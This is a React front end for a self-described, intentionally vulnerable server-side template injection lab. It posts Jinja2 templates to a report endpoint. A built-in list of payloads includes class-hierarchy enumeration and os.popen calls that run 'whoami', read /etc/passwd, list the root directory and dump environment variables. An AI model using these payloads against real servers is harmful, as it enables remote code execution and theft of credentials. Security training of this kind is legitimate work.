import { useState } from "react";
import axios from "axios";

export default function ReportGenerator() {
  const [template, setTemplate] = useState("Xin chào {{name}}!");
  const [context, setContext] = useState('{"name":"NexTrade"}');
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleGenerate = async () => {
    if (!template.trim()) {
      setError("Template is required");
      return;
    }

    setLoading(true);
    setError("");
    setResult("");

    let contextObj = {};
    if (context.trim()) {
      try {
        contextObj = JSON.parse(context);
      } catch (err) {
        setError(`Invalid JSON in Context: ${err.message}`);
        setLoading(false);
        return;
      }
    }

    try {
      const { data } = await axios.post("/api/it/reports/generate", {
        template: template.trim(),
        context: contextObj,
      });
      setResult(data.rendered || "");
    } catch (err) {
      const message = err?.response?.data?.detail || err.message || "Request failed";
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  const testPayloads = [
    {
      name: "Basic Math Test",
      template: "Result: {{7*7}}",
      context: "{}",
      description: "Should return: Result: 49"
    },
    {
      name: "Variable Interpolation",
      template: "Welcome {{username}}! Balance: ${{balance}}",
      context: '{"username":"Admin","balance":"1000000"}',
      description: "Tests basic variable rendering"
    },
    {
      name: "Config Object",
      template: "{{config}}",
      context: "{}",
      description: "Attempts to access Flask config object"
    },
    {
      name: "Class Access (Jinja2)",
      template: "{{''.__class__}}",
      context: "{}",
      description: "Attempts to access Python string class"
    },
    {
      name: "MRO Subclasses",
      template: "{{''.__class__.__mro__[1].__subclasses__()}}",
      context: "{}",
      description: "Lists all accessible Python classes - DANGEROUS"
    },
    {
      name: "System Command (whoami)",
      template: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
      context: "{}",
      description: "Attempts to execute 'whoami' command"
    },
    {
      name: "Read /etc/passwd (Linux)",
      template: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}",
      context: "{}",
      description: "Attempts to read /etc/passwd file"
    },
    {
      name: "List Directory",
      template: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read()}}",
      context: "{}",
      description: "Attempts to list root directory"
    },
    {
      name: "Environment Variables",
      template: "{{self.__init__.__globals__.__builtins__.__import__('os').environ}}",
      context: "{}",
      description: "Attempts to read environment variables"
    }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-8">
      <div className="max-w-6xl mx-auto">
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-gray-800 mb-2">SSTI Vulnerability Tester</h1>
          <p className="text-gray-600">
            Server-Side Template Injection via Jinja2 - Test endpoint at <code className="bg-gray-200 px-2 py-1 rounded">/api/it/reports/generate</code>
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Input Section */}
          <div className="lg:col-span-2 space-y-6">
            <div className="bg-white rounded-xl shadow-lg p-6">
              <h2 className="text-2xl font-bold text-gray-800 mb-4">Test SSTI</h2>
              
              <div className="space-y-4">
                {/* Template Input */}
                <div>
                  <label className="text-sm font-semibold text-gray-700 mb-2 block">Jinja2 Template</label>
                  <textarea
                    value={template}
                    onChange={(e) => setTemplate(e.target.value)}
                    placeholder={"Xin chào {{name}}!\n\nProfit: {{profit}}\nStatus: {% if active %}Active{% else %}Inactive{% endif %}"}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono text-sm min-h-[150px]"
                    disabled={loading}
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    Use Jinja2 syntax: {{"{{"}}}} variable {{"{{"}}}}, {{"{{%"}} if/for {{"{{%"}}, etc.
                  </p>
                </div>

                {/* Context Input */}
                <div>
                  <label className="text-sm font-semibold text-gray-700 mb-2 block">Context (JSON)</label>
                  <textarea
                    value={context}
                    onChange={(e) => setContext(e.target.value)}
                    placeholder={'{"name":"NexTrade","profit":50000,"active":true}'}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono text-sm min-h-[100px]"
                    disabled={loading}
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    Valid JSON object. Leave empty for no variables.
                  </p>
                </div>

                {/* Generate Button */}
                <button
                  onClick={handleGenerate}
                  disabled={!template.trim() || loading}
                  className="w-full px-6 py-3 bg-blue-600 text-white rounded-lg font-semibold hover:bg-blue-700 transition disabled:bg-gray-400 disabled:cursor-not-allowed"
                >
                  {loading ? "Generating..." : "Generate Report"}
                </button>

                {/* Error Display */}
                {error && (
                  <div className="rounded-lg bg-red-50 border border-red-200 p-4">
                    <div className="text-sm font-semibold text-red-800 mb-2">❌ Error</div>
                    <div className="text-sm text-red-700 font-mono whitespace-pre-wrap break-words text-xs max-h-[300px] overflow-y-auto">
                      {error}
                    </div>
                  </div>
                )}

                {/* Result Display */}
                {result && (
                  <div>
                    <p className="mb-2 text-sm font-semibold text-gray-700">✅ Rendered Output</p>
                    <div className="rounded-lg border border-green-200 bg-green-50 p-4">
                      <pre className="whitespace-pre-wrap text-xs font-mono text-gray-800 max-h-[400px] overflow-y-auto">
                        {result}
                      </pre>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Payloads Sidebar */}
          <div className="space-y-4">
            <div className="bg-white rounded-xl shadow-lg p-6">
              <h3 className="text-lg font-bold text-gray-800 mb-4">Quick Payloads</h3>
              <div className="space-y-2 max-h-[900px] overflow-y-auto">
                {testPayloads.map((payload, idx) => (
                  <button
                    key={idx}
                    onClick={() => {
                      setTemplate(payload.template);
                      setContext(payload.context);
                      setResult("");
                      setError("");
                    }}
                    className="w-full text-left p-3 rounded-lg border border-gray-200 hover:bg-blue-50 hover:border-blue-300 transition"
                  >
                    <div className="font-semibold text-sm text-gray-800">{payload.name}</div>
                    <div className="text-xs text-gray-600 mt-1 font-mono break-all">{payload.template.substring(0, 40)}...</div>
                    <div className="text-xs text-gray-500 mt-1">{payload.description}</div>
                  </button>
                ))}
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
              <h4 className="font-bold text-yellow-800 mb-2">⚠️ SSTI Info</h4>
              <p className="text-xs text-yellow-700">
                Server-Side Template Injection allows executing arbitrary code through template syntax. This endpoint is intentionally vulnerable for educational testing.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
